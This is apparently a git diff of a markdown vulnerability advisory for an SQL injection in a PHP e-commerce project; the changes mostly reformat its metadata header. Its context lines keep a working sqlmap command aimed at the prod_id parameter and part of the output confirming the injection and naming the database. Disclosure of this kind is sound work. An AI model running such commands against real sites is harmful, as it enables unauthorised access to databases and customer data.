@@ -1,12 +1,12 @@
 # E-Commerce Website - SQL Injection 2
-+ Exploit Title: E-Commerce Website - SQL Injection 2
-+ Date: 2023-24-12
-+ Exploit Author: Hamdi Sevben
-+ Vendor Homepage: https://code-projects.org/e-commerce-website-in-php-with-source-code/
-+ Software Link: https://download-media.code-projects.org/2020/01/E-COMMERCE_WEBSITE_IN_PHP_WITH_SOURCE_CODE.zip
-+ Version: 1.0
-+ Tested on: Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
-+ CVE: CVE-
++ **Exploit Title:** E-Commerce Website - SQL Injection 2
++ **Date:** 2023-24-12
++ **Exploit Author:** Hamdi Sevben
++ **Vendor Homepage:** https://code-projects.org/e-commerce-website-in-php-with-source-code/
++ **Software Link:** https://download-media.code-projects.org/2020/01/E-COMMERCE_WEBSITE_IN_PHP_WITH_SOURCE_CODE.zip
++ **Version:** 1.0
++ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
++ **CVE:** CVE-
 
 ## References: 
 
@@ -36,6 +36,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 ```
 python sqlmap.py -r r.txt -p prod_id --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
 ```
+
 ```
 ---
 Parameter: prod_id (GET)
@@ -64,4 +65,3 @@ current database: 'electricks'
 
 + current database: `electricks`
 ![2](https://github.com/h4md153v63n/CVEs/assets/5091265/ef46e98d-0521-488a-aef2-0ae24dadba49)
-
